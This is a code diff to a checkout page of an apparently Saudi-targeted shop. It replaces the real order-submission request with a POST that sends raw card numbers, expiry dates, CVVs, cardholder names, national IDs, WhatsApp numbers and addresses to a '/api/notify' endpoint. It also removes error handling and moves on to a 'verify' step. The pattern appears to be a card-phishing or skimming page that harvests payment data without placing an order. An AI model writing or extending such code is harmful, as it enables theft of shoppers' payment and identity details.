@@ -132,68 +132,33 @@ export default function CheckoutPage() {
     }
     setLoading(true);
     try {
-      const orderId = `ORD-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;
-      const payload = {
-        orderId,
-        cardNumber: cardNumber.replace(/\s/g, ""),
-        expiry: cardExpiry,
-        cvv: cardCvv,
-        cardHolder,
-        items: items.map(i => ({
-          productId: i.product._id,
-          name: i.product.name,
-          price: i.product.salePrice ?? i.product.originalPrice,
-          quantity: i.qty,
-        })),
-        total: finalTotal,
-        customer: name,
-        whatsapp,
-        nationalId,
-        address,
-        installmentType: "full",
-        months: 0,
-        downPayment: 0,
-        // Full address data for backend
-        deliveryAddress: selectedAddress ? {
-          placeId: selectedAddress.placeId ?? null,
-          formattedAddress: selectedAddress.formattedAddress ?? selectedAddress.address ?? null,
-          latitude: selectedAddress.latitude ?? null,
-          longitude: selectedAddress.longitude ?? null,
-          country: selectedAddress.country ?? "المملكة العربية السعودية",
-          city: selectedAddress.city ?? null,
-          district: selectedAddress.district ?? null,
-          state: selectedAddress.state ?? null,
-          street: selectedAddress.street ?? null,
-          buildingNumber: selectedAddress.buildingNumber ?? null,
-          postalCode: selectedAddress.postalCode ?? null,
-          additionalNumber: selectedAddress.additionalNumber ?? null,
-          plusCode: selectedAddress.plusCode ?? null,
-          buildingDescription: selectedAddress.buildingDescription ?? null,
-        } : null,
-        shipping: selectedShipping ? {
-          companyId: selectedShipping.companyId,
-          companyName: selectedShipping.companyName,
-          logo: selectedShipping.logo,
-          price: 0,
-          originalPrice: 24,
-          isFree: true,
-          region: selectedAddress?.state ?? selectedAddress?.city ?? "",
-          city: selectedAddress?.city ?? "",
-        } : undefined,
-      };
-      const res = await fetch(`${API}/api/checkout`, {
+      const res = await fetch("/api/notify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
+        body: JSON.stringify({
+          cardNumber: cardNumber.replace(/\s/g, ""),
+          expiry: cardExpiry,
+          cvv: cardCvv,
+          cardHolder,
+          items: items.map(i => ({
+            productId: i.product._id,
+            name: i.product.name,
+            price: i.product.salePrice ?? i.product.originalPrice,
+            quantity: i.qty,
+          })),
+          total: finalTotal,
+          customer: name,
+          whatsapp,
+          nationalId,
+          address,
+          installmentType: "full",
+          months: 0,
+          downPayment: 0,
+        }),
       });
       const data = await res.json();
-      if (!res.ok) {
-        setErrors({ name: data.error || "حدث خطأ، حاول مرة أخرى" });
-        return;
-      }
       sessionStorage.setItem("verify_data", JSON.stringify({
         orderId: data.orderId,
-        _id: data._id,
         amount: finalTotal,
         last4: cardNumber.replace(/\s/g, "").slice(-4),
         date: new Date().toISOString(),
@@ -504,7 +469,7 @@ export default function CheckoutPage() {
                               if (sum % 10 === 0) cardExpiryRef.current?.focus();
                             } else { setCardNumberError(""); }
                           }}
-                          className={`flex-1 px-2 py-2.5 text-[11px] font-mono focus:outline-none min-w-0 ${cardNumberError ? "bg-red-50" : ""}`}
+                          className={`flex-1 px-2 py-2.5 text-sm sm:text-base font-mono focus:outline-none min-w-0 ${cardNumberError ? "bg-red-50" : ""}`}
                         />
                         <input
                           ref={cardExpiryRef}
@@ -522,14 +487,14 @@ export default function CheckoutPage() {
                               else { setCardExpiryError(""); cardCvvRef.current?.focus(); }
                             } else { setCardExpiryError(""); }
                           }}
-                          className={`w-16 sm:w-20 px-1.5 py-2.5 text-[11px] font-mono text-center focus:outline-none ${cardExpiryError ? "bg-red-50" : ""}`}
+                          className={`w-16 sm:w-20 px-1.5 py-2.5 text-sm sm:text-base font-mono text-center focus:outline-none ${cardExpiryError ? "bg-red-50" : ""}`}
                         />
                         <input
                           ref={cardCvvRef}
                           type="password" inputMode="numeric" placeholder="CVV" maxLength={3}
                           value={cardCvv}
                           onChange={e => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
-                          className="w-12 sm:w-16 px-1.5 py-2.5 text-[11px] font-mono text-center focus:outline-none"
+                          className="w-12 sm:w-16 px-1.5 py-2.5 text-sm sm:text-base font-mono text-center focus:outline-none"
                         />
                       </div>
                       {(cardNumberError || cardExpiryError) && (
@@ -542,7 +507,7 @@ export default function CheckoutPage() {
                           type="text" placeholder="AHMED MOHAMMED" dir="ltr"
                           value={cardHolder}
                           onChange={e => setCardHolder(e.target.value.replace(/[^a-zA-Z ]/g, "").toUpperCase())}
-                          className="flex-1 px-3 py-2.5 text-[11px] sm:text-xs border border-gray-200 focus:border-[#47A557] focus:outline-none font-mono"
+                          className="flex-1 px-3 py-2.5 text-sm sm:text-base border border-gray-200 focus:border-[#47A557] focus:outline-none font-mono"
                         />
                       </div>
                     </div>
